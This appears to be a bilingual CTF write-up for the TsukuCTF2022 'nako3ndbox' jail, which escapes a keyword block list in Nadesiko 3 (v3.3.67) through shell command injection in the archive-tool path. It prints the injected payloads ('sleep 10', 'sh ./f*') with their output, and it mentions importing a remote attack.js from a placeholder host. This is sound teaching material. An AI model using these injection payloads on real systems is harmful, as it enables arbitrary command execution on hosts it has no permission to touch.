<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>nako3ndbox-TsukuCTF2022</title><meta name="description" content="このサイトはSecHack365修了生よって運営されている非公式ののファンページです。"/><link rel="icon" href="/favicon.ico"/><meta name="og:title" content="nako3ndbox-TsukuCTF2022"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta property="og:image" content="https://fans.sechack365.com/images/tsukuctf-logo.png"/><meta name="next-head-count" content="9"/><link rel="preload" href="/_next/static/css/21f8e083f97816c3.css" as="style" crossorigin=""/><link rel="stylesheet" href="/_next/static/css/21f8e083f97816c3.css" crossorigin="" data-n-g=""/><link rel="preload" href="/_next/static/css/ffca696ef8ef2fa4.css" as="style" crossorigin=""/><link rel="stylesheet" href="/_next/static/css/ffca696ef8ef2fa4.css" crossorigin="" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" crossorigin="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-146cc4e76e722037.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/framework-10fac88913917d91.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/main-3ae351249979994e.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/pages/_app-7ede516a3bfbb4df.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/1bfc9850-950c562bd9f4b960.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/147-d128eadc2dac4c62.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/212-7f8e90692937549a.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/pages/ctf/TsukuCTF2022/%5Bid%5D-075992e9a33d74f0.js" defer="" crossorigin=""></script><script src="/_next/static/pGek_3YC8jk9kHJKsQkjz/_buildManifest.js" defer="" crossorigin=""></script><script src="/_next/static/pGek_3YC8jk9kHJKsQkjz/_ssgManifest.js" defer="" crossorigin=""></script></head><body><div id="__next"><div><div class="x1aogm5o xvqvw8y xudrmeu x78zum5 x1q0g3np x6s0dn4"><a class="xrv4cvt xc342km x1sxf85j x5yr21d x1ypdohk x78zum5 x6s0dn4 xexx8yu x1iji9kk x18d9i69 x1sln4lm x1aogm5o x18eybuq xxzecl9 x117nqv4 xd8780z xnc0nkd x17ituo4 x1sivnnp" href="/">TOP</a><a class="xrv4cvt xc342km x1sxf85j x5yr21d x1ypdohk x78zum5 x6s0dn4 xexx8yu x1iji9kk x18d9i69 x1sln4lm x1aogm5o x18eybuq x19xzur5 xd8780z xnc0nkd x17ituo4 x1sivnnp" href="/blog">参加記</a><a class="xrv4cvt xc342km x1sxf85j x5yr21d x1ypdohk x78zum5 x6s0dn4 xexx8yu x1iji9kk x18d9i69 x1sln4lm x1aogm5o x18eybuq x19xzur5 xd8780z xnc0nkd x17ituo4 x1sivnnp" href="/timer">†締切駆動コース†</a><a class="xrv4cvt xc342km x1sxf85j x5yr21d x1ypdohk x78zum5 x6s0dn4 xexx8yu x1iji9kk x18d9i69 x1sln4lm x1aogm5o x18eybuq x19xzur5 xd8780z xnc0nkd x17ituo4 x1sivnnp" href="/ctf">TsukuCTF</a><a class="xrv4cvt xc342km x1sxf85j x5yr21d x1ypdohk x78zum5 x6s0dn4 xexx8yu x1iji9kk x18d9i69 x1sln4lm x1aogm5o x18eybuq x19xzur5 xd8780z xnc0nkd x17ituo4 x1sivnnp" href="https://github.com/SecHack365-Fans/SecHack365-Fans.github.io"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a></div><div style="padding:15px"><h1>nako3ndbox</h1>
<h2>問題文</h2>
<p>に・ほ・ん・ご・で・あ・そ・ぼ<br/>
<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">nc tsukuctf.sechack365.com 31418</code></p>
<h2>難易度</h2>
<p><strong>medium</strong></p>
<h2>作問にあたって</h2>
<p>なでしこ 3 の修正済みである脆弱性を使った Jail 問題です。<br/>
<!-- -->もともとは最新版を使い<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">！「http://ctf.example.com/attack.js」を取り込み</code>で RCE させようと思っていましたが、<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">ナデシコする</code>でうまく動かないため、見つけた脆弱性を用いる事にしました。<br/>
<!-- -->一応、CVE-2022-41642 のバイパスなのでまだ CVE はついていません(頑張れば脆弱性なしで解けます)。</p>
<h2>解法</h2>
<p>なでしこ 3 を用いた Jail 問題のようだ。<br/>
<!-- -->配布されたソースは以下のようであった。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-bash" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>「------------------------------------------------------------
</span>             _        _____           _ _
<span> _ __   __ _</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> _____</span><span class="token token" style="color:#67cdcc">|</span><span>___ / _ __   __</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>__   _____  __
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _` | |/ / _ \ |_ \| &#x27;</span><span>_ </span><span class="token token" style="color:#ccc">\</span><span> / _` </span><span class="token token" style="color:#67cdcc">|</span><span> &#x27;_ </span><span class="token token" style="color:#ccc">\</span><span> / _ </span><span class="token token" style="color:#ccc">\</span><span> </span><span class="token token" style="color:#ccc">\</span><span>/ /
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#ccc">(</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>   </span><span class="token token" style="color:#67cdcc">&lt;</span><span> </span><span class="token token" style="color:#ccc">(</span><span>_</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>__</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#ccc">(</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>_</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#ccc">(</span><span>_</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&gt;</span><span>  </span><span class="token token" style="color:#67cdcc">&lt;</span><span>
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span class="token token" style="color:#ccc">\</span><span>__,_</span><span class="token token" style="color:#67cdcc">|</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span class="token token" style="color:#ccc">\</span><span>_</span><span class="token token" style="color:#ccc">\</span><span>___/____/</span><span class="token token" style="color:#67cdcc">|</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>_</span><span class="token token" style="color:#67cdcc">|</span><span class="token token" style="color:#ccc">\</span><span>__,_</span><span class="token token" style="color:#67cdcc">|</span><span>_.__/ </span><span class="token token" style="color:#ccc">\</span><span>___/_/</span><span class="token token" style="color:#ccc">\</span><span>_</span><span class="token token" style="color:#ccc">\</span><span>
</span>
<!-- -->------------------------------------------------------------」と言う
<!-- -->
<!-- -->「日本語コード：」と尋ねる
<!-- -->それを入力に代入
<!-- -->
<!-- -->ブラックリスト＝「読、開、保存、実行、起動、サーバ、フォルダ、ファイル、ナデシコ、ディレクトリ、flag」を「、」で区切る
<!-- -->
<!-- -->ブラックリスト！＝空の間
<!-- -->　　ブラックリストの０から１を配列取り出す
<!-- -->　　もし（入力でそれの出現回数）！＝０ならば
<!-- -->　　　　「日本語の世界からは出しませんよ！！！」と言う
<!-- -->　　　　終了する
<!-- -->　　ここまで
<!-- -->ここまで
<!-- -->
<!-- -->「｛入力｝」をナデシコする
<!-- -->
<!-- -->終了する</code></div></pre>
<p>入力された文字列をブラックリストで検証し、eval にあたる<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">ナデシコする</code>で実行している。<br/>
<!-- -->ブラックリストがない場合、<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">「ls」を起動</code>などで RCE 可能だが今回は難しい。<br/>
<!-- -->ここで配布されたファイルより、なでしこ 3 が最新版でなく、3.3.67 である点に注目する。<br/>
<!-- -->GitHub の Issues を見てやると<a href="https://github.com/kujirahand/nadesiko3/issues/1325">cnako3 の圧縮解凍の問題</a>が見つかる。<br/>
<!-- -->複数のシングルクォートを圧縮解凍系の処理に含めることで、OS コマンドインジェクションが可能なようだ。<br/>
<!-- -->この修正を参考に任意コード実行を行う。<br/>
<!-- -->今回は以下のように<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">圧縮解凍ツールパス</code>の引数としてコマンドを与える。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-bash" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>$ </span><span class="token token" style="color:#f08d49">nc</span><span> tsukuctf.sechack365.com </span><span class="token token" style="color:#f08d49">31418</span><span>
</span>------------------------------------------------------------
<!-- -->             _        _____           _ _
<span> _ __   __ _</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> _____</span><span class="token token" style="color:#67cdcc">|</span><span>___ / _ __   __</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>__   _____  __
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _` | |/ / _ \ |_ \| &#x27;</span><span>_ </span><span class="token token" style="color:#ccc">\</span><span> / _` </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _ \ \/ /
</span><span class="token token" style="color:#7ec699">| | | | (_| |   &lt; (_) |__) | | | | (_| | |_) | (_) &gt;  &lt;
</span><span class="token token" style="color:#7ec699">|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\
</span><span class="token token" style="color:#7ec699">
</span><span class="token token" style="color:#7ec699">------------------------------------------------------------
</span><span class="token token" style="color:#7ec699">日本語コード：圧縮解凍ツールパスは「&#x27;</span><span>&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sleep</span><span> </span><span class="token token" style="color:#f08d49">10</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;」。「」を「」へ解凍
</span><span class="token token" style="color:#7ec699">/bin/sh: &#x27;</span><span class="token token" style="color:#f8c555">:</span><span> not found
</span><span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span><span></span><span class="token token" style="color:#ccc">[</span><span>実行時エラー</span><span class="token token" style="color:#ccc">]</span><span>app</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">1</span><span>行目</span><span class="token token" style="color:#ccc">)</span><span>: Command failed: </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">\</span><span>&#x27;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sleep</span><span> </span><span class="token token" style="color:#f08d49">10</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> x </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -o</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -y
</span>/bin/sh: &#x27;: not found
<span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span>~~~</code></div></pre>
<p><code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">sleep 10</code>を行うと 10 秒スリープした。<br/>
<!-- -->フラグは<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">flag.txt</code>にあるので読みだせばよいが、<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">flag</code>がブラックリストにある。<br/>
<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">./f*</code>などで回避してやればよい。<br/>
<!-- -->コマンドの実行結果がなぜか出てこないことがあるので、<code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">sh</code>に渡してエラーとして吐き出せばよい。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-bash" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>$ </span><span class="token token" style="color:#f08d49">nc</span><span> tsukuctf.sechack365.com </span><span class="token token" style="color:#f08d49">31418</span><span>
</span>------------------------------------------------------------
<!-- -->             _        _____           _ _
<span> _ __   __ _</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> _____</span><span class="token token" style="color:#67cdcc">|</span><span>___ / _ __   __</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>__   _____  __
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _` | |/ / _ \ |_ \| &#x27;</span><span>_ </span><span class="token token" style="color:#ccc">\</span><span> / _` </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _ \ \/ /
</span><span class="token token" style="color:#7ec699">| | | | (_| |   &lt; (_) |__) | | | | (_| | |_) | (_) &gt;  &lt;
</span><span class="token token" style="color:#7ec699">|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\
</span><span class="token token" style="color:#7ec699">
</span><span class="token token" style="color:#7ec699">------------------------------------------------------------
</span><span class="token token" style="color:#7ec699">日本語コード：圧縮解凍ツールパスは「&#x27;</span><span>&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sh</span><span> ./f*</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;」。「」を「」へ解凍
</span><span class="token token" style="color:#7ec699">/bin/sh: &#x27;</span><span class="token token" style="color:#f8c555">:</span><span> not found
</span><span>./flag.txt: line </span><span class="token token" style="color:#f08d49">1</span><span>: TsukuCTF22</span><span class="token token" style="color:#ccc">{</span><span>y0u_jump3d_0u7_0f_j4p4n353</span><span class="token token" style="color:#ccc">}</span><span>: not found
</span><span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span><span></span><span class="token token" style="color:#ccc">[</span><span>実行時エラー</span><span class="token token" style="color:#ccc">]</span><span>app</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">1</span><span>行目</span><span class="token token" style="color:#ccc">)</span><span>: Command failed: </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">\</span><span>&#x27;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sh</span><span> ./f*</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> x </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -o</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -y
</span>/bin/sh: &#x27;: not found
<span>./flag.txt: line </span><span class="token token" style="color:#f08d49">1</span><span>: TsukuCTF22</span><span class="token token" style="color:#ccc">{</span><span>y0u_jump3d_0u7_0f_j4p4n353</span><span class="token token" style="color:#ccc">}</span><span>: not found
</span><span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span>~~~</code></div></pre>
<p>flag が得られた。</p>
<h2>TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}</h2>
<h2>Abstract</h2>
<p>This is a Jail related to a known vulnerability in なでしこ 3
First I intended to make a RCE question by <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">！「http://ctf.example.com/attack.js」を取り込み</code>. However, <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">ナデシコする</code> didn&#x27;t work well. Thats why I use the vulnerability instead.</p>
<h2>Solve</h2>
<p>This seems Jail with なでしこ 3.
The ditributed source code is the following.</p>
<pre><code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]"></code></pre>
<!-- -->&lt;!-- XXXX:なでしこソース追加 --&gt;<!-- -->
<p>This program execute the given strings with <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">ナデシコする</code> which corresponds to the eval command after given strings are checked.
You could RCE by <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">「ls」を起動</code> if it were not checked. We can&#x27;t do this for this case.
Btw, this is ver 3.3.67 which is not the latest one and this has <a href="https://github.com/kujirahand/nadesiko3/issues/1325">an issue related to cnako3</a>
This is OS command injection. You can use this vulnerability.</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-bash" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>$ </span><span class="token token" style="color:#f08d49">nc</span><span> tsukuctf.sechack365.com </span><span class="token token" style="color:#f08d49">31418</span><span>
</span>------------------------------------------------------------
<!-- -->             _        _____           _ _
<span> _ __   __ _</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> _____</span><span class="token token" style="color:#67cdcc">|</span><span>___ / _ __   __</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>__   _____  __
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _` | |/ / _ \ |_ \| &#x27;</span><span>_ </span><span class="token token" style="color:#ccc">\</span><span> / _` </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _ \ \/ /
</span><span class="token token" style="color:#7ec699">| | | | (_| |   &lt; (_) |__) | | | | (_| | |_) | (_) &gt;  &lt;
</span><span class="token token" style="color:#7ec699">|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\
</span><span class="token token" style="color:#7ec699">
</span><span class="token token" style="color:#7ec699">------------------------------------------------------------
</span><span class="token token" style="color:#7ec699">日本語コード：圧縮解凍ツールパスは「&#x27;</span><span>&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sleep</span><span> </span><span class="token token" style="color:#f08d49">10</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;」。「」を「」へ解凍
</span><span class="token token" style="color:#7ec699">/bin/sh: &#x27;</span><span class="token token" style="color:#f8c555">:</span><span> not found
</span><span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span><span></span><span class="token token" style="color:#ccc">[</span><span>実行時エラー</span><span class="token token" style="color:#ccc">]</span><span>app</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">1</span><span>行目</span><span class="token token" style="color:#ccc">)</span><span>: Command failed: </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">\</span><span>&#x27;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sleep</span><span> </span><span class="token token" style="color:#f08d49">10</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> x </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -o</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -y
</span>/bin/sh: &#x27;: not found
<span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span>~~~</code></div></pre>
<p><code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">sleep 10</code> make the thread sleep for 10 seconds.
As the <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">flag</code> is blacklisted, you should specify like <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">./f*</code> to get <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">flag.txt</code>.
I don&#x27;t know why but sometimes we can&#x27;t get the result. So get the result as Error Message through <code class="undefined MarkdownRender_inlineCode__xySf4" node="[object Object]">sh</code> instead.</p>
<pre><div node="[object Object]" class="MarkdownRender_code__F4sq8" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-bash" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>$ </span><span class="token token" style="color:#f08d49">nc</span><span> tsukuctf.sechack365.com </span><span class="token token" style="color:#f08d49">31418</span><span>
</span>------------------------------------------------------------
<!-- -->             _        _____           _ _
<span> _ __   __ _</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> _____</span><span class="token token" style="color:#67cdcc">|</span><span>___ / _ __   __</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>__   _____  __
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _` | |/ / _ \ |_ \| &#x27;</span><span>_ </span><span class="token token" style="color:#ccc">\</span><span> / _` </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _ \ \/ /
</span><span class="token token" style="color:#7ec699">| | | | (_| |   &lt; (_) |__) | | | | (_| | |_) | (_) &gt;  &lt;
</span><span class="token token" style="color:#7ec699">|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\
</span><span class="token token" style="color:#7ec699">
</span><span class="token token" style="color:#7ec699">------------------------------------------------------------
</span><span class="token token" style="color:#7ec699">日本語コード：圧縮解凍ツールパスは「&#x27;</span><span>&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sh</span><span> ./f*</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;」。「」を「」へ解凍
</span><span class="token token" style="color:#7ec699">/bin/sh: &#x27;</span><span class="token token" style="color:#f8c555">:</span><span> not found
</span><span>./flag.txt: line </span><span class="token token" style="color:#f08d49">1</span><span>: TsukuCTF22</span><span class="token token" style="color:#ccc">{</span><span>y0u_jump3d_0u7_0f_j4p4n353</span><span class="token token" style="color:#ccc">}</span><span>: not found
</span><span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
